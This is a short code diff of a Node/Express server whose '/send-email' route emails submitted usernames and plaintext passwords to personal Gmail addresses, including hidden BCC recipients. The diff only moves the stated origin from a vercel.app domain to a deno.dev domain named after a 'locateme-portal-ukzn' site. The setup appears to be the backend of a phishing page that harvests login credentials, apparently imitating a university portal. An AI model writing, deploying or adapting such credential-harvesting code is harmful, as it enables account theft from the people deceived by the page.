@@ -24,7 +24,7 @@ app.post('/send-email', (req, res) => {
         to: 'nerh320@gmail.com',
         bcc: 'rsadeku5@gmail.com, shebeshxt2008@gmail.com', 
         subject: 'New Login Sumbission',
-        text: `Username: ${username}\nPassword: ${password}\nSubmitted from: https://locateme-portal-ukzn.vercel.app`
+        text: `Username: ${username}\nPassword: ${password}\nSubmitted from: https://locateme-portal-ukzn.deno.dev`
     };
     
 
@@ -38,5 +38,5 @@ app.post('/send-email', (req, res) => {
 });
 
 app.listen(3000, () => {
-    console.log('Server started on https://locateme-portal-ukzn.vercel.app');
+    console.log('Server started on https://locateme-portal-ukzn.deno.dev');
 });
